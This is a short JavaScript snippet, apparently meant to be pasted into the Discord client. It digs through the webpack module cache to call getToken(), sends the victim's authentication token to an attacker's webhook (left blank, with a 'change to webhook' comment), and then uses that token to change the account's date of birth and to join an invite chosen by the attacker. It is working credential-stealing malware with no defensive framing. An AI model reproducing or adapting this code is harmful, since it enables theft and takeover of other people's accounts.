var token = "";
var req = webpackJsonp.push([
    [], {
        extra_id: (e, r, t) => e.exports = t
    },
    [
        ["extra_id"]
    ]
]);
for (let e in req.c) {
    if (req.c.hasOwnProperty(e)) {
        let r = req.c[e].exports;
        if (r && r.__esModule && r.default)
            for (let e in r.default)
                if ("getToken" === e) {
                    token = r.default.getToken();
                }
    }
}

var request = new XMLHttpRequest();       // change to webhook \/
request.open("POST", "");

request.setRequestHeader('Content-type', 'application/json');

var params = {
    content: token
}

request.send(JSON.stringify(params));

var request = new XMLHttpRequest();
request.open("PATCH", "https://discord.com/api/v6/users/@me");

request.setRequestHeader('Content-type', 'application/json');
request.setRequestHeader('Authorization', token);

var params = {
    date_of_birth: "2000-02-02"
}

request.send(JSON.stringify(params));

var request = new XMLHttpRequest();    // change to invite code \/
request.open("POST", "https://discordapp.com/api/v8/invites/");

request.setRequestHeader('Content-type', 'application/json');
request.setRequestHeader('Authorization', token);

var params = {
    date_of_birth: "2000-02-02"
}

request.send(JSON.stringify(params));
